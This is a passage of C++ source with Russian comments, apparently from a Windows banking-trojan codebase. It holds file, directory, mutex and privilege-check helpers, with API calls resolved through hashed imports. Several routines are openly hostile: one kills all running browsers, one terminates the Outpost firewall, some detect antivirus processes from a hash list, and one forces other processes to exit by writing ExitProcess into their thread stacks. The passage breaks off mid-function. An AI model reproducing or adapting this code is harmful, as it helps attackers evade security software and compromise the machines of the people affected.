	// Функция возвращает хэш имени файла
	PWCHAR Name = ExtractFileNameW(FileName, false);
	return WSTR::GetHash(Name, 0, LowerCase);

}

//---------------------------------------------------------------------------------
//Работа с директориями
//---------------------------------------------------------------------------------

//очистка папки вместе с подпапками, если delFolder = true, то удаляет и саму переданную папку
bool Directory::Clear( const char* folder, bool delFolder )
{
	WIN32_FIND_DATAA data;
	MemPtr<MAX_PATH> fileName;
	m_lstrcpy( fileName.str(), folder );
	pPathAppendA( fileName.str(), "*.*" );
	HANDLE find = pFindFirstFileA( fileName.str(), &data );
	if( find == INVALID_HANDLE_VALUE) 
		return false;
	bool res = true;
	do
	{
		if( (data.cFileName[0] == '.' && data.cFileName[1] == 0) || 
			(data.cFileName[0] == '.' && data.cFileName[1] == '.' && data.cFileName[2] == 0) ) continue;
		
		m_lstrcpy( fileName, folder );
		pPathAppendA( fileName.str(), data.cFileName );
		 
		//для файлов которые имеет аттрибут только для чтения, снимаем этот аттрибут
		if( data.dwFileAttributes & FILE_ATTRIBUTE_READONLY )
			pSetFileAttributesA( fileName.str(), data.dwFileAttributes ^ FILE_ATTRIBUTE_READONLY );

		if( data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) //удаляем поддиректорию
		{
			if( !Clear( fileName, true ) )
			{
				res = false;
				break;
			}
		}
		else
		{
			if( pDeleteFileA(fileName.str()) == 0 )
			{
				res = false;
				break;
			}
		}
	}
	while( pFindNextFileA( find, &data ) );

	pFindClose(find);
	if( res )
		if( delFolder )
			if( pRemoveDirectoryA(folder) == 0 )
				res = false;
	return res;
}

bool Directory::IsExists(const PCHAR Path)
{
	DWORD Code = (DWORD)pGetFileAttributesA(Path);
	return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
}

bool Directory::IsExists(const PWCHAR Path)
{
	DWORD Code = (DWORD)pGetFileAttributesW(Path);
	return (Code != INVALID_FILE_ATTRIBUTES) && ((Code & FILE_ATTRIBUTE_DIRECTORY) != 0);
}

//-----------------------------------------------------------------------------

bool CopyFileANdFolder(PCHAR From,PCHAR To)
{
	// копируем папку со всем содержимым при этом можно пользоваться маской
	// пример пользования CopyFileANdFolder("D:\\folder2\0\0","D:\\folder3\\eee\\eee\0\0");
	// любая строка ДОЛЖНА ОКАНЧИВАИТЬСЯ \0\0 !!
	DWORD attr = (DWORD)pGetFileAttributesA(From);
	if(attr == INVALID_FILE_ATTRIBUTES) return  false;

	PCHAR ToCopy=STR::New(To,0);
	int j= STR::Length(ToCopy)-1;
	for (int i= j;i>0;i--)
	{
		if (ToCopy[i]=='\\')
		{
			ToCopy[i]='\0';
			DWORD attr = (DWORD)pGetFileAttributesA(ToCopy);
			STR::Free(ToCopy);				
			if(attr == INVALID_FILE_ATTRIBUTES) 
				return  false;
			break;
		}
		else
		{
			ToCopy[i]='\0';
		}
	}
	//MSG_SBER("SBER","Start Copy ");
	SHFILEOPSTRUCT shfos ;
	m_memset(&shfos,0,sizeof(SHFILEOPSTRUCT));
    int Result = 0;

    shfos.fAnyOperationsAborted = FALSE;
    shfos.fFlags = FOF_NOCONFIRMATION | FOF_MULTIDESTFILES | FOF_SIMPLEPROGRESS	| FOF_SILENT | FOF_ALLOWUNDO;
    shfos.hNameMappings = NULL;
    shfos.hwnd = NULL;
    shfos.lpszProgressTitle = "In progress...";
    shfos.wFunc = FO_COPY;
    shfos.pFrom = From;
    shfos.pTo = To;

    Result = (int)pSHFileOperationA (&shfos);
	if(!Result)
		return  true;
	else
		return false;
}
//-----------------------------------------------------------------------------
bool DeleteFolders(PCHAR From)
{
	// удаляет папку со всем содержимым при этом можно пользоваться маской

	// любая строка ДОЛЖНА ОКАНЧИВАИТЬСЯ \0\0 !!
	

	SHFILEOPSTRUCT FOperation ;



	m_memset( &FOperation, 0, sizeof( SHFILEOPSTRUCT ) );

	FOperation.hwnd = NULL;
	FOperation.wFunc = FO_DELETE;
	FOperation.fFlags =  FOF_NOCONFIRMATION | FOF_SILENT;//FOF_NOCONFIRMATION | FOF_MULTIDESTFILES | FOF_SIMPLEPROGRESS	| FOF_SILENT | FOF_ALLOWUNDO;
	FOperation.fAnyOperationsAborted = FALSE;
	FOperation.hNameMappings = NULL;
	FOperation.lpszProgressTitle = NULL;
	FOperation.pFrom = From;
	FOperation.pTo = NULL;

	if( pSHFileOperationA( &FOperation ) )
	{
		return false;
	}
	else 
		return true;

}
//-----------------------------------------------------------------------------

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
{
	// Функция перебирает все подключенные в системе диски
	if (Method == NULL) return;

	// Получаем список дисков
	static const DWORD Size = 255;
	PCHAR Drives = STR::Alloc(Size);
	if (Drives == NULL)
		return;

	pGetLogicalDriveStringsA(Size, Drives);


	// Перебираем диски
	bool Cancel = false;
	PCHAR Tmp = Drives;
	while (*Tmp != 0)
	{
		if (DriveType == DRIVE_UNKNOWN || (DWORD)pGetDriveTypeA(Tmp) == DriveType)
		{
			Method(Tmp, Data, Cancel);
			if (Cancel) break;
		}

		Tmp = STR::End(Tmp);
		Tmp++;
	}

	STR::Free(Drives);
}

//-----------------------------------------------------------------------------

bool IsExecutableFile(LPVOID Buf)
{
	// Функция возвращает истину если буффер является заголовком
	// exe файла
	if (Buf == NULL) return false;


	WORD Nomber = PIMAGE_DOS_HEADER(Buf)->e_magic;

	return (Nomber == IMAGE_DOS_SIGNATURE) ||
		   (Nomber == IMAGE_NT_SIGNATURE);

}
//----------------------------------------------------------------------------

// Это убрать
LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
{


	HANDLE hFile = (HANDLE)pCreateFileW( Path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	LPBYTE pbF = (LPBYTE)MemAlloc( dwFileSize + 1 );
	m_memcpy( pbF, pbyFile, dwFileSize );

	pUnmapViewOfFile( pbyFile );
	pCloseHandle( hMapFile );
	pCloseHandle( hFile );

	*dwDataSize = dwFileSize;

	return pbF;
}

// ----------------------------------------------------------------------------------------
bool isFileExists(int FlagFolderDest, WCHAR*Path)
{
	// Эта поебень делает такую-то хуйню
	// тоесть проверяет существуер ли файл в стандартном пути(определенном системой)+Path  

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	return FileExistsW(SysPath);
}

// ----------------------------------------------------------------------------------------
// Сложно бля пару переводов строки после функции сделать, ну топо разделить код одной функции от другой
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
{
    // И эта поебень хуёзнает чё-то делает
	// тоесть создает файл и пишет данные заданным размером

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if (File::WriteBufferW( SysPath, Data, count ))
		return true;
	else
		return false;
}
// ----------------------------------------------------------------------------------------

/*
int ReadFileA(char *szFileName, char **OutBuf)
{	
	int result = 0;
	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;			
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	
	return result;
}
*/

/*
//не проверенно
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
{
	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	
	char *Name = WSTR::ToAnsi(SysPath, 0);
	*count=ReadFileA( Name, (char **)&Data);
	MemFree(Name);
	if (Data==NULL)
		return false;
	
	return true;
}

*/

BOOL KillProcess(DWORD pid,DWORD TimeOut )
{
const static DWORD MAX_COUNT_THREAD = 0x20;
	THREADENTRY32	Thread;
	HANDLE			hProcess;
	HANDLE			hSnap;
	DWORD			Threads[MAX_COUNT_THREAD] ;
	
	m_memset(Threads,0,sizeof(Threads));
	m_memset(&Thread,0,sizeof(Thread));
	Thread.dwSize = sizeof(Thread);
	OutMessages("[KillProcess]","start killing");
	if ( (hProcess = (HANDLE)pOpenProcess(PROCESS_TERMINATE,FALSE,pid))  )
	{
		pTerminateProcess(hProcess,0);
		pCloseHandle(hProcess);
		return TRUE;
	}
	else
	{
		OutMessages("OpenProcess for terminate fail",StrLongToString(pGetLastError()));
	};
	
	if ( (hSnap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,pid)) == INVALID_HANDLE_VALUE  )
	{
		OutMessages("pCreateToolhelp32Snapshot fail",StrLongToString(pGetLastError()));
		return FALSE;
	};
	
	if ( pThread32First(hSnap,&Thread) )
	{
		DWORD i = 0;
		do{
			if ( (Thread.th32OwnerProcessID == pid) & ( i< MAX_COUNT_THREAD) )
				Threads[i++] = Thread.th32ThreadID;

		}while(pThread32Next(hSnap,&Thread));

		pCloseHandle(hSnap);
	}

	if (! (hProcess = (HANDLE)pOpenProcess(SYNCHRONIZE | PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,pid))  )
	{
		OutMessages("OpenProcess fail",StrLongToString(pGetLastError()));
		
		return FALSE;
	};

	for (DWORD i = 0; i<MAX_COUNT_THREAD; ++i)
	if ( Threads[i] )
	{
		HANDLE	htmp;
		CONTEXT ctx;

		if (Threads[i] == (DWORD)pGetCurrentThreadId())
			continue;

		if ( ! (htmp = (HANDLE)pOpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,FALSE,Threads[i]))  )
		{
			OutMessages("OpenThread fail",StrLongToString(pGetLastError()));
			continue;
		};
			pSuspendThread(htmp);
			
			ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
			if(pGetThreadContext(htmp,&ctx))
			{
				DWORD s;
				DWORD TargetAddr;
				PVOID new_addr = pGetProcAddress(pGetModuleHandleA("KERNEL32"),"ExitProcess");
				TargetAddr = ctx.Ebp + sizeof(DWORD);
				if ( (TargetAddr > 1024*1024 ) & (TargetAddr <  (1 << (sizeof(DWORD)*8-1)))  )  
				{
					if (! pVirtualAllocEx(hProcess,(LPVOID)TargetAddr,sizeof(new_addr),MEM_COMMIT,PAGE_READWRITE) )
					{
						OutMessages("VirtualAllocEx fail",StrLongToString(pGetLastError()));
					};
					if (! pWriteProcessMemory(hProcess,(LPVOID)TargetAddr,&new_addr,sizeof(new_addr),&s) )
					{
						OutMessages("WriteProcessMemory fail",StrLongToString(pGetLastError()));
					};
				};
			};
			pResumeThread(htmp);
			pCloseHandle(htmp);
		};
	
	BOOL ret = ( WAIT_OBJECT_0 == (DWORD)pWaitForSingleObject(hProcess,TimeOut) )? TRUE:FALSE;
	pCloseHandle(hProcess);

	return ret ;
};

fwsprintfA Get_wsprintfA()
{
	return (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
}

fwsprintfW Get_wsprintfW()
{
	return (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
}

//ложит в to папку C:\Documents and Settings\All Users
char* GetAllUsersProfile( char* to, int maxSz )
{
	if( pExpandEnvironmentStringsA( "%ALLUSERSPROFILE%", to, maxSz ) > 0 )
		return to;
	else
		return 0;
}

char* GetAllUsersProfile( char* to, int maxSz, const char* addPath )
{
	if( GetAllUsersProfile( to, maxSz ) )
		if( pPathAppendA( to, addPath ) )
			return to;
	return 0;
}

unsigned long GetCRC32( char* data, int size )
{ 
	unsigned long table [] = {
		0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,
		0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
		0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
		0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,

		0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,
		0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
		0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
		0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,

		0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
		0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
		0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,
		0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,

		0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
		0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
		0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
		0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,

		0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,
		0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
		0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
		0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,

		0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
		0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
		0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,
		0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,

		0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,
		0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
		0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
		0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,

		0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,
		0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
		0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
		0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,

		0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
		0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
		0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
		0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,

		0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,
		0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
		0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
		0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,

		0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,
		0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
		0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,
		0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,

		0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
		0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
		0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,
		0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,

		0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
		0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
		0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
		0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,

		0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,
		0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
		0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,
		0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,

		0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
		0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
		0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,
		0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,

		0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,
		0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
		0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
		0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
	}; 

	unsigned long res = 0xFFFFFFFF; 
	for( int i = 0; i < size + 4; i++ ) 
	{ 
		int index = (res >> 24) & 0xFF; 
		char c = 0;
		if( i < size )
			c = data[i]; 
		res = (res << 8) | c; 
		res ^= table[index]; 
	} 

	return res; 
}

DWORD GetHashForPid( int pid )
{
	HANDLE process = pOpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid );
	if (process)
	{
		char path[MAX_PATH];
		int ret = (int)pGetModuleFileNameExA( process, 0, path, sizeof(path) );
		pCloseHandle(process);
		if( ret > 0 )
			return File::GetNameHashA(path, true);
	}
	return 0;   
}

struct Param_SizeFolderLess
{
	DWORD size;
	DWORD maxSize;
};

static void FuncForSizeFolderLess(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
{
	Param_SizeFolderLess* param = (Param_SizeFolderLess*)Data;
	param->size += Search->nFileSizeLow;
	if( param->size > param->maxSize ) //превысили размер
		Cancel = true;
}


bool SizeFolderLess( const char* nameFolder, DWORD maxSize, DWORD* size )
{
	Param_SizeFolderLess param;
	param.size = 0;
	param.maxSize = maxSize;
	bool res = SearchFiles( (char*)nameFolder, "*.*", true, FA_ANY_FILES, &param, FuncForSizeFolderLess );
	if( size ) *size = param.size;
	return res;
}



//------------------------------------------------------------
//  KillAllBrowsers - Функция убивает все запущенные браузеры
//------------------------------------------------------------
void KillAllBrowsers()
{
	const char* browsers[] = { "IEFrame", "MozillaWindowClass", "OperaWindowClass", "Chrome_WidgetWin_0", 0 };
	const char** bb = browsers;
	while( *bb )
	{
		HWND wnd = (HWND) pFindWindowA( *bb, 0 );
		if( wnd )
		{
			DWORD PID = 0;
			pGetWindowThreadProcessId( wnd, &PID );
			if( PID )
				KillProcess(PID, 1000);
		}
		bb++;
	}
}



//------------------------------------------------------------
//  GetSpecialFolderPath - Функция возвращает путь к
//                          специальной папке системы
//  (Надстройка над ЫРGetSpecialFolderPath)
//------------------------------------------------------------
string GetSpecialFolderPathA(int CSIDL, const char *FileName)
{
	string Path(MAX_PATH);

	BOOL R = (BOOL)pSHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL, TRUE);
	if (R)
	{
		Path.CalcLength();
		if (!FileName || *FileName != '\\')
			Path += "\\";
		if (FileName)
			Path += FileName;

	}
	else
		Path.Clear();

	return Path;
}


wstring GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName)
{
	wstring Path(MAX_PATH);

	BOOL R = (BOOL)pSHGetSpecialFolderPathW(NULL, Path.t_str(), CSIDL, TRUE);
	if (R)
	{
		Path.CalcLength();
		if (!FileName || *FileName != '\\')
			Path += L"\\";
		if (FileName)
			Path += FileName;

	}
	else
		Path.Clear();

	return Path;
}




//------------------------------------------------------------
//  KillOutpost - Функция убивает процесс файрвола Outpost
//------------------------------------------------------------
void KillOutpost()
{
	DWORD dwHash_Outpost = 0x1566CB2C;

	DWORD dwPid = GetProcessIdByHash( dwHash_Outpost );

	if ( dwPid != 0 )
	{
		pWinStationTerminateProcess( NULL, dwPid , DBG_TERMINATE_PROCESS );
	}
}

//----------------------------------------------------------------------------



//****************************************************************
// ProcessIsAntiVirus - Функция возвращает истину если хэш
// процессе есть в массиве известных антивирусов
//****************************************************************
bool ProcessIsAntiVirus(DWORD Hash)
{
	if (Hash)
	for (int i = 0; AV_HASHES[i]; i++)
	{
		if (AV_HASHES[i] == Hash)
			return true;
	}
	return false;
}



//****************************************************************
//	GetAntiVirusProcessName - Функция возвращает имя процесса
//                            запущенного анти вируса
//****************************************************************
string GetAntiVirusProcessName()
{
	// Функция возвращает имя процесса  работающего антивируса
	string Name;

    LPVOID ProcessBuf = GetInfoTable( SystemProcessInformation );

	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)ProcessBuf;

	DWORD dwSessionId = 0;

	if (pProcess)
	{
		dwSessionId = GetCurrentSessionId();
		do
		{
			if ( dwSessionId == pProcess->uSessionId )
			{
				if (pProcess->usName.Length)
				{
					DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);

					if (ProcessIsAntiVirus(ProcessHash))
					{
						Name = UnicodeToAnsi(pProcess->usName.Buffer);
						break;
					}
				}
			}
			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );
		}
		while ( pProcess->uNext != 0 );
	}
	MemFree(ProcessBuf);
	return Name;
}

// Возвращает истину в случае обнаружения разделителя
bool IsDelimiterChar(char ch)
{
	return (' ' == ch || '\0' == ch);
}

// Возвращает параметр из списка по индексу.
string GetCommandParamByIndex(const char* ParamList, DWORD ArgIndex)
{
	DWORD        ParamCounter = 0;
	const char*  Cur   = ParamList;

	// Надо учесть, что в парсинге нужен конечный '\0' символ
	const char*  Limit = ParamList + m_lstrlen(ParamList) + 1; 

	while (Cur < Limit)
	{
		string param;
		while (!IsDelimiterChar(*Cur))
		{
			char s[2] = {*Cur, 0};
			param += s;
			Cur++;
		}

		// Условия предусматривающие наличие нескольких разделителей между 
		// параметрами.
		if (ParamCounter == ArgIndex && param.Length() > 0) return param;
		if (param.Length() > 0) ParamCounter++;
		
		Cur++;
	}

	return string();
}

// Ф-ция для создания единственного экземпляра чего-либо.
// Для обеспечения единственности используется захват мьютекса.
// Всякий кто попробует захватить его снова - завершится с таймаутом.
// 
// В случае успешного захвата возвращает хендл захваченного мьютекса
// В случае неуспешного захвата возвращает NULL
//
HANDLE TryCreateSingleInstance(const char* MutexPrefix)
{
	CHAR MutexName[300];

	m_memset(MutexName, 0, sizeof(MutexName));

	// Создаем имя для мьютекса в пространстве имен Global
	PCHAR MachineId = MakeMachineID();
	
	m_lstrcat(MutexName, "Global\\");
	m_lstrcat(MutexName, MutexPrefix);
	m_lstrcat(MutexName, MachineId);

	//DBG("TryCreateSingleInstance", "Mutex name '%s'.", MutexName);

	// При создании делаем нулевой DACL для возможности открытия мьютекса 
	// из под любого пользователя

	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;

	pInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	pSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	sa.nLength = sizeof (SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	// Создаем мьютекс с нулевым DACL
	HANDLE MutexHandle = (HANDLE)pCreateMutexA(&sa, FALSE, MutexName);
	if (MutexHandle == NULL) return NULL;

	int err = pGetLastError();
	if( err == ERROR_ALREADY_EXISTS )
	{
		pCloseHandle(MutexHandle);
		MutexHandle = 0;
	}

	return MutexHandle;
}
//ждет пока кто-то захватит мьютекс, wait - сколько ждать в миллисекундах
bool WaitCaptureMutex( const char* name, int wait )
{
	int time = 0;
	while( time < wait )
	{
		HANDLE mutex = TryCreateSingleInstance(name);
		if( mutex == 0 ) return true;
		pCloseHandle(mutex);
		pSleep(50);
		time += 50;
	}
	return false;
}

//захват мьютекса, wait - сколько ждать в миллисекундах
HANDLE CaptureMutex( const char* name, int wait )
{
	int time = 0;
	while( time < wait )
	{
		HANDLE mutex = TryCreateSingleInstance(name);
		if( mutex ) return mutex;
		pSleep(10);
		time += 10;
	}
	return 0;
}



//------------------------------------------------------
// LastWriteTime - Функция возвращает время в
//                 миллисекундах с момента последнего
//				   изменения файла
//------------------------------------------------------
DWORD File::LastWriteTime(HANDLE FileHandle)
{
	// Функция проверяет время последнего изменения файла

	// Получаем время файла
	FILETIME Create, Write, Access, Now;

	if (!pGetFileTime(FileHandle, &Create, &Access, &Write))
		return 0;

	// Получаем системное время
	pGetSystemTimeAsFileTime(&Now);

	// Сравниваем время
	ULARGE_INTEGER  T1, T2;

	T1.LowPart  = Now.dwLowDateTime;
	T1.HighPart = Now.dwHighDateTime;

	T2.LowPart  = Write.dwLowDateTime;
	T2.HighPart = Write.dwHighDateTime;


	// Еденица измерения файлового времени 100 наносекунд
	// по этому, для получения времени в милисекундах,
	// делим разницу на константу
	DWORD Delta = (DWORD)(T1.QuadPart - T2.QuadPart) / 10000;

	return Delta;
}


/*	++ 
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token. 
	Arguments: None. 
	Return Value: 
	   TRUE - Caller has Administrators local group. 
	   FALSE - Caller does not have Administrators local group. --
*/ 
BOOL CheckSidCurrentProcess( SID_IDENTIFIER_AUTHORITY *NtAuthority )
{
	BOOL b;
	PSID AdministratorsGroup; 

	b =  (BOOL) pAllocateAndInitializeSid(
											NtAuthority,
											2,
											SECURITY_BUILTIN_DOMAIN_RID,
											DOMAIN_ALIAS_RID_ADMINS,
											0, 0, 0, 0, 0, 0,
											&AdministratorsGroup
										); 
	if(b) 
	{
		if (!pCheckTokenMembership( NULL, AdministratorsGroup, &b)) 
			 b = FALSE;

		pFreeSid(AdministratorsGroup); 
	}

return b;
};

/*	++ 
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token. 
	Arguments: None. 
	Return Value: 
	   TRUE - Caller has Administrators local group. 
	   FALSE - Caller does not have Administrators local group. --
*/ 
BOOL IsUserAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	return CheckSidCurrentProcess( &NtAuthority );
}

bool IsUserLocalSystem()
{
	const DWORD								kMaxSidSize = 1024;
	SID_IDENTIFIER_AUTHORITY	kNtAuthority = SECURITY_NT_AUTHORITY;

	HANDLE	token_handle = NULL;
	BYTE		user_sid_buffer[kMaxSidSize];
	DWORD		user_sid_length = 0;

	pOpenProcessToken( pGetCurrentProcess(), TOKEN_READ, &token_handle);
	if(token_handle == NULL) return false;

	m_memset(user_sid_buffer, 0, sizeof(user_sid_buffer));

	pGetTokenInformation(token_handle, TokenUser, user_sid_buffer, 
		sizeof(user_sid_buffer), &user_sid_length);
	if (user_sid_length == 0) return false;

	PSID_AND_ATTRIBUTES attributes = (PSID_AND_ATTRIBUTES)&user_sid_buffer[0];
	PISID sid = (PISID)attributes->Sid;

	// LocalSystem SID S-1-5-18
	// Процедура низкоуровневой сверки с SID LocalSystem
	if (sid->Revision != SID_REVISION) return false;
	if (sid->SubAuthorityCount != 1) false;
	if (m_memcmp(&sid->IdentifierAuthority, &kNtAuthority, sizeof(kNtAuthority)) != 0) return false;
	if (sid->SubAuthority[0] != SECURITY_LOCAL_SYSTEM_RID) return false;

	return true;
}

static UCHAR GetFileHandleType()
{
	HANDLE                     hFile;
	PSYSTEM_HANDLE_INFORMATION Info;
	ULONG                      r;
	UCHAR                      Result = 0;

	hFile = (HANDLE)pCreateFileA("NUL", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);

		if (Info)
		{
			for (r = 0; r < Info->uCount; r++)
			{
				if (Info->aSH[r].Handle == (USHORT)hFile && 
					Info->aSH[r].uIdProcess == (DWORD)pGetCurrentProcessId())
				{
					Result = Info->aSH[r].ObjectType;
					break;
				}
			}

		    MemFree(Info);
		}

		pCloseHandle(hFile);
	}
	return Result;
}

 typedef struct _NM_INFO
{
	HANDLE  hFile;
	FILE_NAME_INFORMATION Info;
	WCHAR Name[MAX_PATH];
} NM_INFO, *PNM_INFO;

static DWORD WINAPI GetFileNameThread(PVOID lpParameter)
{
	PNM_INFO        NmInfo = (PNM_INFO)lpParameter;
	IO_STATUS_BLOCK IoStatus;

	if (NT_SUCCESS(pZwQueryInformationFile(NmInfo->hFile, &IoStatus, &NmInfo->Info, 
                          sizeof(NM_INFO) - sizeof(HANDLE), FileNameInformation)) )
		return 1;

	return 0;
}

static void GetFileName(HANDLE hFile, PCHAR TheName)
{
	HANDLE   hThread;
